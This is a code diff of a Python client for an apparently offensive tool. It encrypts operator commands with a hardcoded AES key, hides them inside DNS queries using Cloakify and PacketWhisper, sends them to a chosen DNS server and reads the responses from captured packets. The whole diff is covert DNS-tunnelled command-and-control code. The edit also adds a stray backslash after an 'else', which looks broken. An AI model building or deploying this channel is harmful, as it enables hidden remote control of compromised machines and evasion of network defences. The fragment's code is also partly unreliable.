@@ -4,12 +4,12 @@ import argparse
 from decloakify import Decloakify
 from aes_encrypt import decrypt_message, encrypt_message
 from cloakify import Cloakify
-from scapy.all import sniff, wrpcap
-from packetWhisper import CloakAndTransferFile, ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries, TransferCloakedFile
+from packetWhisper import ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries, TransferCloakedFile
 
 # Chiave AES (16, 24 o 32 byte)
 key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
 cipher = "ciphers\\common_fqdn\\topWebsites"
+command = None
 
 def send_command(command, dns='localhost'):
     # Criptare il comando
@@ -38,7 +38,7 @@ def send_command(command, dns='localhost'):
     os.remove(cloaked_command)
 
 
-def receive_response():
+def receive_response(dns='localhost'):
     #print("Capturing pcap...")
     subprocess.call(['python', 'pcapCapture.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
     #print("pcap collected...")
@@ -140,11 +140,12 @@ i@@m               '///|-     >f^    |/   }rnf,                   B@@'
         if args.dns:
             dns = args.dns
         command = input("> ")
-        if dns:
+        if args.dns:
             send_command(command, dns)
-        else:
+        else:\
             send_command(command)
-        try:
-            receive_response() 
-        except Exception as e:
-            print(f'Something wrong happend during the connection: {e}')
+        if args.dns:
+            try:
+                receive_response(dns) 
+            except Exception as e:
+                print(f'Something wrong happend during the connection: {e}')
